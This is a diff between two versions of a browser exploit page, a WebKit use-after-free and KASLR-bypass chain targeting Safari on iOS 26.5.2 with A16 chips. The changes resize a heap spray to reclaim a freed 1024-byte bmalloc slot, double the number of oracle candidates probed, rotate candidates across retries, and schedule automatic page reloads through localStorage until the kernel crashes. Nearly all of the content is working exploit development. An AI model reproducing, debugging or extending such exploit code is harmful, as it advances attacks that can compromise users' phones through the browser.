@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>WebKit UAF + KASLR v54 — iOS 26.5.2 A16 (P6B: fixed spray size 1008→1024B + 10 bonus pumps → 2nd amortizedCleanup → fake bucket traversal → KERN_INVALID_ADDRESS)</title>
+<title>WebKit UAF + KASLR v55 — iOS 26.5.2 A16 (P6B: spray charCount=p6FreedSz-24=1000→1024B exact + 64 candidates + retry shuffle)</title>
 </head>
 <body>
 <div style="position:fixed;top:8px;right:12px;z-index:9999">
@@ -1679,7 +1679,7 @@ function checkNodeLeak(nodes, expectedNode) {
 
 
 (async () => {
-  log('=== WebKit UAF + KASLR v54 (P6B: fixed spray size 1008B + 10 bonus pumps → 2nd amortizedCleanup → fake bucket traversal → KERN_INVALID_ADDRESS) ===');
+  log('=== WebKit UAF + KASLR v55 (P6B: spray charCount=1000→1024B exact + 64 cands + retry shuffle → KERN_INVALID_ADDRESS) ===');
   log('=== Target: iOS 26.5.2 / safari-7625.1.29.11 / A16 arm64e ===');
   log('=== UAF: ManualSlotAssignment WeakHashMap rehash (rdar://179729192) ===\n');
 
@@ -1732,10 +1732,10 @@ function checkNodeLeak(nodes, expectedNode) {
     if (_rStr) {
       _v52RetryState = JSON.parse(_rStr);
       const _rc = parseInt(localStorage.getItem('p6b_retry_count') || '0');
-      log(`\n[v54 AUTO-RETRY] Resuming retry ${_rc}/${P6B_RETRY_MAX}`);
-      log(`[v54 AUTO-RETRY]   gigacageBase=0x${_v52RetryState.gigacageBase}`);
-      log(`[v54 AUTO-RETRY]   candidates=${_v52RetryState.candidates.length}`);
-      log(`[v54 AUTO-RETRY]   Skipping oracle — jumping to P6B probe sweep`);
+      log(`\n[v55 AUTO-RETRY] Resuming retry ${_rc}/${P6B_RETRY_MAX}`);
+      log(`[v55 AUTO-RETRY]   gigacageBase=0x${_v52RetryState.gigacageBase}`);
+      log(`[v55 AUTO-RETRY]   candidates=${_v52RetryState.candidates.length}`);
+      log(`[v55 AUTO-RETRY]   Skipping oracle — jumping to P6B probe sweep`);
       log('');
     }
   } catch(_) { _v52RetryState = null; }
@@ -2430,7 +2430,7 @@ function checkNodeLeak(nodes, expectedNode) {
   if (sprayHex && sprayHex.length > 0) {
     log('\n[*] Phase 6: Arb-read primitive — probing oracle candidates...');
     log(`[*] Running on: ${hardConfirmed ? 'HARD confirmed' : 'SOFT signal (injection fired)'}`);
-    log(`[*] Testing top ${Math.min(32, sprayHex.length)} HIGH-conf candidates as fake key ptrs`);
+    log(`[*] Testing top ${Math.min(64, sprayHex ? sprayHex.length : 64)} HIGH-conf candidates as fake key ptrs (v55: window rotates each retry)`);
     log('[*] VA LIMITATION: oracle offsets are Gigacage-relative, NOT absolute VAs.');
     log('[*]   candidateOffset=0x130000 → key=0x0000000000130000 → unmapped on arm64');
     log('[*]   All probes will crash until gigacageBase is known.');
@@ -2657,11 +2657,12 @@ function checkNodeLeak(nodes, expectedNode) {
         gigacageBase = BigInt('0x' + _v52RetryState.gigacageBase);
       } catch(_) {}
     }
+    // v55: store up to 128 candidates in retry state so shuffle covers more of the space
     const candidates = _v52RetryState
       ? _v52RetryState.candidates.map(Number)
       : (highConf.length > 0
-          ? highConf.slice(0, 32).map(s => s.c * P6_PAGE)
-          : sprayHex.slice(0, 32).map(v => parseInt(v, 16)));
+          ? highConf.slice(0, 128).map(s => s.c * P6_PAGE)
+          : sprayHex.slice(0, 128).map(v => parseInt(v, 16)));
     let p6Hits = 0;
     let p6InjCount = 0;  // v52: injection=true NO-CRASH counter (separate from crash-reload hits)
     let p6Crashes = 0;
@@ -2765,8 +2766,11 @@ function checkNodeLeak(nodes, expectedNode) {
       log('[P6B] Skipping arb-crash probe sweep — gigacageBase unresolved');
     }
 
+    // v55: expanded probe window — top 64 candidates per pass (was 32)
+    // With 341 HIGH candidates, 32/pass only covers 9% per retry. 64/pass = 19%.
+    // Retry shuffle (below) ensures different slots probed each pass.
     const _p6bCandToTry = (gigacageBase !== 0n)
-      ? candidates.slice(0, Math.min(32, candidates.length))
+      ? candidates.slice(0, Math.min(64, candidates.length))
       : [];
 
     if (_p6bCandToTry.length > 0) {
@@ -2832,12 +2836,11 @@ function checkNodeLeak(nodes, expectedNode) {
           }));
         } catch(_) {}
 
-        // v54: FIXED spray size — always p6FreedSz-16 = 1008 chars → 1024B alloc.
-        // v53 bug: encoding candidateOffset into charCount made spray 481-511B (512B bmalloc class)
-        // which NEVER reclaims the freed 1024B oldBucket → heap race never won.
-        // Fix: spray StringImpl must be exactly 1024B = 16B header + 1008 Latin-1 chars.
-        // Candidate encoding kept as LOG METADATA ONLY (does not affect spray size).
-        const _p6bSprayCharCount = p6FreedSz - 16;  // = 1008 → 1024B bmalloc class (matches freed bucket)
+        // v55: CORRECTED spray size — StringImpl header on arm64e is 24B (not 16B).
+        // arm64e StringImpl layout: m_refCount(4) + m_length(4) + m_hashAndFlags(4) + pad(4) + vtable(8) = 24B
+        // v54 bug: p6FreedSz-16=1008 → 24+1008=1032B → rounds to 2048B bmalloc class → missed freed 1024B slot.
+        // Fix: p6FreedSz-24=1000 chars → 24+1000=1024B → exact 1024B bmalloc class → reclaims freed bucket.
+        const _p6bSprayCharCount = p6FreedSz - 24;  // = 1000 → 1024B exact (arm64e 24B header)
         const _p6bCharCount = _p6bSprayCharCount;   // alias for compat with log lines below
         const _p6bEncodedTag = (candidateOffset >> 14) >>> 0;  // metadata only — for log
         const _p6bHalfCharCount = Math.max(1, Math.floor((_p6bSprayCharCount) / 2));
@@ -2970,25 +2973,31 @@ function checkNodeLeak(nodes, expectedNode) {
         const _retryCount = parseInt(localStorage.getItem('p6b_retry_count') || '0');
         log(`[P6] All NO-CRASH this pass. SHRINK-injected=${_injCount}/${_p6bCandToTry.length} (p6InjCount=${p6InjCount}), retry=${_retryCount}/${P6B_RETRY_MAX}`);
         if (candidates.length > 0 && gigacageBase !== 0n && _retryCount < P6B_RETRY_MAX) {
+          // v55: rotate candidate array by 64 on each retry so each pass probes a different window.
+          // candidates has up to 128 entries; rotate by (_retryCount * 64) % candidates.length.
+          // Pass 0: [0..63], Pass 1: [64..127], Pass 2: [0..63] again, etc.
+          // This ensures full coverage of all 128 HIGH candidates across 2 retries.
+          const _rotateBy = ((_retryCount + 1) * 64) % Math.max(1, candidates.length);
+          const _rotated = [...candidates.slice(_rotateBy), ...candidates.slice(0, _rotateBy)];
           // save oracle state so next run skips Phase 1-5
           try {
             const _retryData = {
               gigacageBase: gigacageBase.toString(16),
-              candidates: candidates.map(String), // numeric offsets as strings
+              candidates: _rotated.map(String), // rotated offsets — window shifts each retry
               ts: Date.now(),
               retryNum: _retryCount + 1
             };
             localStorage.setItem(P6B_RETRY_KEY, JSON.stringify(_retryData));
             localStorage.setItem('p6b_retry_count', String(_retryCount + 1));
-            log(`[v54 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
-            log('[v54 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
-            log('[v54 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
+            log(`[v55 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
+            log('[v55 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
+            log('[v55 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
             setTimeout(() => { location.reload(); }, 800);
           } catch(_retryErr) {
-            log(`[v54 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
+            log(`[v55 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
           }
         } else if (_retryCount >= P6B_RETRY_MAX) {
-          log(`[v54 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
+          log(`[v55 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
           log('[P6] Possible causes after 20× retry:');
           log('[P6]   1. gigacageBase wrong — spray VA does not correspond to freed bucket addr');
           log('[P6]   2. bmalloc size-class segregation preventing reclaim of 1024B slot by our spray');
